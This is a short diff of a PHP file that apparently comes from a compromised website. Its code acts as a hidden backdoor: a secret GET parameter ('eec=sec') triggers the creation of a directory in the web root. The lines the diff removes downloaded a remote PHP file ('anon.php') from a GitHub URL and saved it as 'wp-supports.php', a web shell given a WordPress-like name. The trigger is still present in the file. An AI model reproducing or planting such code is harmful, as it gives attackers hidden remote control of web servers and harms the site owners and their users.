@@ -1,12 +1,7 @@
 <?php 
 if(isset($_GET["eec"])&&$_GET["eec"]=="sec"){ 
 mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-et");
-echo('Eec secra');  
-
-$supports = sexx('https://raw.githubusercontent.com/Hrecc/Re/main/anon.php');
-$src = "wp-supports.php";
-if (file_put_contents($src, $supports));
-
+echo('Eec secra');   
 
 }
 
